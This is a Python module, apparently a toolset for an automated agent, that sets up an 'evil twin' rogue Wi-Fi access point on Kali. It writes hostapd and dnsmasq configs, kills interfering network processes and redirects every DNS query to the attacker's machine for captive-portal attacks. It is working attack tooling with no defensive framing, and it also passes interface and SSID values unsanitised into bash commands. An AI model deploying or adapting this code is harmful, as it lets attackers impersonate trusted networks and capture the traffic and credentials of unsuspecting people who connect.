import subprocess
import shlex
import os
import time

class EvilTwinTools:
    """Tools for standing up Rogue Access Points (Evil Twin) on Kali."""

    # Temporary configuration paths
    HOSTAPD_CONF = "/tmp/swarm_hostapd.conf"
    DNSMASQ_CONF = "/tmp/swarm_dnsmasq.conf"

    @staticmethod
    def _run_cmd(cmd, timeout=30):
        try:
            process = subprocess.Popen(
                ["bash", "-c", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(timeout=timeout)
            if process.returncode != 0:
                return f"[Error] Return {process.returncode}:\n{stderr.strip()}"
            return stdout.strip() if stdout.strip() else "[Success] Command completed."
        except subprocess.TimeoutExpired:
            return f"[Error] Command timed out after {timeout} seconds."
        except Exception as e:
            return f"[Error] Execution failed: {str(e)}"

    @staticmethod
    def start_rogue_ap(interface, ssid, channel=6):
        """
        Start an open hostapd access point on the specified interface and SSID.
        Requires interface to be free of NetworkManager control.
        """
        conf_content = f"""interface={interface}
ssid={ssid}
channel={channel}
hw_mode=g
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        try:
            with open(EvilTwinTools.HOSTAPD_CONF, "w") as f:
                f.write(conf_content)
        except Exception as e:
            return f"[Error] Failed to write hostapd conf: {e}"

        # Kill conflicting processes and start hostapd
        EvilTwinTools._run_cmd(f"sudo airmon-ng check kill", timeout=15)
        # Start detached
        EvilTwinTools._run_cmd(f"sudo hostapd -B {EvilTwinTools.HOSTAPD_CONF}", timeout=15)
        return f"[Success] Started rogue AP '{ssid}' on {interface}."

    @staticmethod
    def stop_rogue_ap():
        """Kill any active hostapd and dnsmasq instances, and restart NetworkManager."""
        res1 = EvilTwinTools._run_cmd("sudo killall hostapd", timeout=10)
        res2 = EvilTwinTools._run_cmd("sudo killall dnsmasq", timeout=10)
        EvilTwinTools._run_cmd("sudo systemctl start NetworkManager", timeout=15)
        return f"Cleanup complete:\nhostapd: {res1}\ndnsmasq: {res2}"

    @staticmethod
    def start_captive_dns(interface):
        """
        Start dnsmasq to hand out IPs and route all DNS queries to self.
        Useful for Captive Portal attacks.
        """
        conf_content = f"""interface={interface}
dhcp-range=192.168.10.10,192.168.10.100,8h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
# Route all traffic to this router
address=/#/192.168.10.1
"""
        try:
            with open(EvilTwinTools.DNSMASQ_CONF, "w") as f:
                f.write(conf_content)
        except Exception as e:
            return f"[Error] Failed to write dnsmasq conf: {e}"

        # Assign IP routing
        EvilTwinTools._run_cmd(f"sudo ifconfig {interface} up 192.168.10.1 netmask 255.255.255.0", timeout=10)
        EvilTwinTools._run_cmd(f"sudo route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1", timeout=10)
        
        # Start dnsmasq using the config file
        res = EvilTwinTools._run_cmd(f"sudo dnsmasq -C {EvilTwinTools.DNSMASQ_CONF} -d &", timeout=5) # -d is no-daemon, we fork it in bash with &
        return f"[Success] Started dnsmasq captive portal routing on {interface}. Output: {res}"
